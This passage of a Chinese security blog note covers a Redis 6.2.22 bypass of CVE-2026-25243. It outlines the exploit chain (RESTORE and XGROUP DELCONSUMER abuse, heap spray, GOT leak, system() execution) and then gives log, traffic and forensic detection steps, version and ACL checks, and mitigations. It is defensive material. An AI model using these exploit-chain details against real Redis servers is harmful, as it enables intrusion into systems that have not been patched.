+<li>对于 Redis 6.2.22，非官方编译版本需通过 calibrate.sh 校准二进制偏移量</li>
+</ul>
+<p><strong>二进制安全特性 (redis-server-6.2.22):</strong></p>
+<ul>
+<li>架构: amd64-64-little</li>
+<li>RELRO: Partial（GOT 可覆写 — 此特性被利用链中 write@GOT 泄露步骤所利用）</li>
+<li>Stack Canary: 未发现 canary</li>
+<li>NX: 已启用</li>
+<li>PIE: 已启用</li>
+<li>调试符号: 是，未 strip</li>
+</ul>
+<h2 id="section-6-攻击调查-9">6. 攻击调查</h2>
+<h3 id="section-日志检查-10">日志检查</h3>
+<p>Redis 默认不记录每条命令的详细日志。以下方法可用于检测可能的利用尝试：</p>
+<ol>
+<li><strong>检查 Redis 慢查询日志</strong> — 查找异常的 RESTORE 和 XGROUP DELCONSUMER 命令组合:</li>
+</ol>
+<pre><code class="language-bash"># 连接 Redis 后执行:
+redis-cli SLOWLOG GET 100
+
+# 关注以下模式:
+# - RESTORE 命令后紧跟 XGROUP DELCONSUMER（对同一 key 的消费者组的异常删除序列）
+# - 大量 SETEX/SET/APPEND 操作在短时间内密集执行（heap spray 特征）
+# - CONFIG SET 命令修改非标准参数
+</code></pre>
+<ol start="2">
+<li><strong>检查 Redis 日志文件中的异常记录:</strong></li>
+</ol>
+<pre><code class="language-bash"># 默认路径: /var/log/redis/redis-server.log 或容器内 /data/redis.log
+grep -E &quot;(RESTORE|XGROUP.*DELCONSUMER|CONFIG SET)&quot; /var/log/redis/redis-server.log
+
+# 关注以下异常:
+# - 短时间内出现大量 DELCONSUMER 调用
+# - RESTORE 加载的 key 在加载后立即被修改或删除
+</code></pre>
+<ol start="3">
+<li><strong>检查系统日志中由 Redis 子进程产生的异常:</strong></li>
+</ol>
+<pre><code class="language-bash"># system() RCE 会产生 fork+exec 子进程
+grep -E &quot;redis.*vfork|redis.*system&quot; /var/log/syslog
+grep -E &quot;redis.*vfork|redis.*system&quot; /var/log/messages
+
+# 检查 /tmp 目录下是否出现攻击者写入的证据文件:
+ls -la /tmp/pwned* /data/pwned*
+</code></pre>
+<h3 id="section-流量检查-11">流量检查</h3>
+<ol>
+<li><strong>监控 Redis 协议流量中的异常命令序列:</strong></li>
+</ol>
+<p>在 Redis 端口 (默认 6379) 上捕获流量并分析命令模式:</p>
+<pre><code class="language-bash"># tcpdump 捕获 Redis 流量:
+tcpdump -i eth0 -s 0 -w redis_traffic.pcap port 6379
+
+# 使用 Wireshark 或 tshark 分析，关注以下 RESP 协议命令:
+# - RESTORE 命令（包含长十六进制 payload 的恢复操作）
+# - XGROUP DELCONSUMER 对同一 stream key 的多次连续调用
+# - 22 字符长度 key 的大量 SET/SETEX 操作（堆喷特征）
+</code></pre>
+<ol start="2">
+<li><strong>利用 redis-cli MONITOR 命令实时监控（注意性能影响）:</strong></li>
+</ol>
+<pre><code class="language-bash"># 实时监控命令流（生产环境谨慎使用 — 有性能损耗）
+redis-cli MONITOR | grep -E &quot;RESTORE|DELCONSUMER|SETEX&quot;
+
+# 关注以下异常模式:
+# 1. RESTORE 命令的 payload 长度异常（正常 RDB 数据通常较大，但攻击 payload 可能有特定大小）
+# 2. 同一 stream key 在 RESTORE 后立即执行多个 DELCONSUMER
+# 3. 短时间内异常大量的 SETEX 操作
+</code></pre>
+<h3 id="section-入侵痕迹检查-12">入侵痕迹检查</h3>
+<ol>
+<li><strong>检查异常文件:</strong> 此漏洞的 exploit 执行 system() 后可能留下痕迹文件:</li>
+</ol>
+<pre><code class="language-bash"># 检查 /tmp 和 /data 目录下是否存在非预期的文件:
+find /tmp -name &quot;pwned*&quot; -mtime -7 2&gt;/dev/null
+find /data -name &quot;pwned*&quot; -mtime -7 2&gt;/dev/null
+
+# 检查 Redis 数据目录下的异常文件:
+find /data -type f -not -name &quot;*.rdb&quot; -not -name &quot;*.aof&quot; -mtime -7 2&gt;/dev/null
+</code></pre>
+<ol start="2">
+<li><strong>检查进程异常:</strong> Redis server 启动子进程是正常行为（RDB/AOF 持久化），但非持久化时段出现的子进程需关注:</li>
+</ol>
+<pre><code class="language-bash"># 检查 Redis 进程的当前子进程:
+ps aux | grep -E &quot;redis.*\[&quot;
+
+# 使用 auditd 监控 system() 调用（事后审计）:
+# 在 /etc/audit/rules.d/redis.rules 中添加:
+# -a always,exit -F arch=b64 -S execve -F uid=999 -k redis_exec
+# 然后执行: auditctl -R /etc/audit/rules.d/redis.rules
+# 查看审计日志: ausearch -k redis_exec | aureport -x
+</code></pre>
+<ol start="3">
+<li><strong>检查内存异常:</strong> 利用链涉及 dictType 劫持，可能导致某些 hash 操作行为异常:</li>
+</ol>
+<pre><code class="language-bash"># 使用 DEBUG OBJECT 检查可疑 key（此命令被 exploit 本身也使用）:
+# 此命令可揭示对象的内部编码和引用计数
+
+# 若怀疑被入侵，检查所有 stream 类型 key 的消费者组结构:
+redis-cli --scan --pattern &quot;*&quot; | while read key; do
+  type=$(redis-cli TYPE &quot;$key&quot;)
+  if [ &quot;$type&quot; = &quot;stream&quot; ]; then
+    echo &quot;=== Stream: $key ===&quot;
+    redis-cli XINFO GROUPS &quot;$key&quot;
+  fi
+done
+</code></pre>
+<h2 id="section-7-自查方法-13">7. 自查方法</h2>
+<h3 id="section-版本检查-14">版本检查</h3>
+<pre><code class="language-bash"># 方法 1: 通过 redis-cli 检查
+redis-cli INFO server | grep redis_version
+# 正常输出示例: redis_version:6.2.22
+
+# 方法 2: 通过命令行检查
+redis-server --version
+# 正常输出示例: Redis server v=6.2.22 sha=00000000:0 malloc=jemalloc-5.1.0 bits=64 build=...
+
+# 判断逻辑:
+# - 版本 8.8.0 及以上 → 不受影响
+# - 版本 6.2.22 / 7.4.9 / 8.6.4 → 受此绕过影响（需进一步评估加固措施）
+# - 版本 7.2.14 / 8.2.6 / 8.4.3 → 需验证是否受此绕过影响（待更多测试确认）
+# - 版本低于上述修复版本 → 同时受原始 CVE-2026-25243 和此绕过影响
+</code></pre>
+<h3 id="section-命令权限检查-15">命令权限检查</h3>
+<pre><code class="language-bash"># 检查当前 ACL 配置是否限制了 RESTORE 命令:
+redis-cli ACL LIST
+# 关注输出中是否有用户被授予了 RESTORE、EVAL、XGROUP 命令权限
+# 理想状态下，非管理用户不应有 RESTORE 和 EVAL 权限
+
+# 检查 sanitize-dump-payload 配置:
+redis-cli CONFIG GET sanitize-dump-payload
+# 若输出为 &quot;no&quot; 或空 → 允许未清洗的 RDB payload 加载
+# 若输出为 &quot;yes&quot; → RESTORE payload 会被清洗，攻击面显著缩小
+</code></pre>
+<h3 id="section-非破坏性自查-16">非破坏性自查</h3>
+<p>以下命令序列可用于检查 Redis 实例的 Stream 消费者组是否存在异常状态，但不会触发漏洞：</p>
+<pre><code class="language-bash"># 1. 扫描所有 stream key 的消费者组信息:
+redis-cli --scan --pattern &quot;*&quot; | while read key; do
+  type=$(redis-cli TYPE &quot;$key&quot;)
+  if [ &quot;$type&quot; = &quot;stream&quot; ]; then
+    echo &quot;Key: $key&quot;
+    redis-cli XINFO GROUPS &quot;$key&quot;
+    for group in $(redis-cli XINFO GROUPS &quot;$key&quot; | grep &quot;name&quot; | awk &#39;{print $2}&#39;); do
+      echo &quot;  Consumers in group $group:&quot;
+      redis-cli XINFO CONSUMERS &quot;$key&quot; &quot;$group&quot;
+    done
+  fi
+done
+
+# 2. 检查 XGROUP 相关操作的审计记录（若启用了 Redis 审计）:
+redis-cli --csv SLOWLOG GET 100 | grep -i &quot;xgroup\|restore&quot;
+</code></pre>
+<h2 id="section-8-临时缓解-17">8. 临时缓解</h2>
+<p><strong>警告：</strong> 以下缓解措施属于临时防护手段，不能替代升级至 Redis 8.8.0+。缓解措施均有局限性，建议组合使用。</p>
+<h3 id="section-缓解措施-使用-acl-禁用-restore-命令-18">缓解措施： 使用 ACL 禁用 RESTORE 命令</h3>
+<p>这是最有效的临时缓解措施，直接阻断攻击所需的 RESTORE 命令：</p>
+<pre><code class="language-bash"># 方案 A: 为默认用户禁用 RESTORE 命令
+redis-cli ACL SETUSER default -@all +@read +@write +@set +@sortedset +@list +@hash +@string +@bitmap +@hyperloglog +@geo +@stream -restore -eval
+
+# 方案 B: 创建受限用户并禁用 RESTORE/EVAL/XGROUP DELCONSUMER
+redis-cli ACL SETUSER app_user on &gt;password ~* +@all -restore -eval -debug
+redis-cli ACL SETUSER admin_user on &gt;strongpassword ~* +@all
+
+# 方案 C: 完全禁用所有用户的 RESTORE 命令（若业务不需要）
+redis-cli ACL SETUSER default on &gt;password ~* +@all -restore -eval
+
+# 验证 ACL 配置:
+redis-cli ACL LIST
+# 使用受限用户尝试 RESTORE 应返回: (error) NOPERM this user has no permissions to run the &#39;restore&#39; command
+</code></pre>
+<h3 id="section-缓解措施局限性说明-19">缓解措施局限性说明</h3>
+<ul>
+<li><strong>ACL 禁用 RESTORE:</strong> 部分 Redis 管理工具和备份恢复流程依赖 RESTORE 命令，禁用前需评估对运维流程的影响</li>
+<li><strong>网络 ACL:</strong> 无法防御来自受信任内网 IP 的攻击，也无法防御已获得主机访问权限的本地攻击者</li>
+</ul>
+<footer class="article-end"><span>END OF RESEARCH NOTE</span><p>最后更新于 2026.07.23 · hongzh0's Blog</p></footer><nav class="article-nav" aria-label="文章导航"><a class="article-nav-prev" rel="prev" href="promotion-reward-bypass-record.html" aria-label="上一篇：推广奖励场景中的账号生命周期绕过：通杀型漏洞挖掘记录"><span>上一篇</span><strong>推广奖励场景中的账号生命周期绕过：通杀型漏洞挖掘记录</strong></a></nav></article></div></main>
+<footer class="site-footer"><div class="wrap footer-grid"><div><a class="brand footer-brand" href="../index.html"><img class="brand-avatar" src="/assets/avatar-72.webp" srcset="/assets/avatar-72.webp 72w, /assets/avatar-128.webp 128w" sizes="36px" alt="" width="36" height="36" decoding="async"><span>hongzh0's Blog</span></a><p>安全研究、Agent应用、工具开发。</p></div><div class="footer-links"><span>探索</span><a href="../archive.html">文章归档</a><a href="../links.html">友链</a><a href="../about.html">关于我</a><a href="../feed.xml">RSS 订阅</a></div><div class="footer-links"><span>连接</span><a href="https://github.com/hg0434hongzh0" target="_blank" rel="noreferrer">GitHub <span aria-hidden="true">↗</span></a></div><div class="footer-end"><span>© 2026 HONGZH0</span><span class="site-stats" aria-label="站点访问统计"><span>PV <strong id="busuanzi_site_pv">—</strong></span><span>UV <strong id="busuanzi_site_uv">—</strong></span></span><button type="button" class="back-top" aria-label="返回顶部"><span aria-hidden="true">↑</span></button></div></div></footer><script src="../assets/main.js?v=2822c22d651c"></script></body></html>
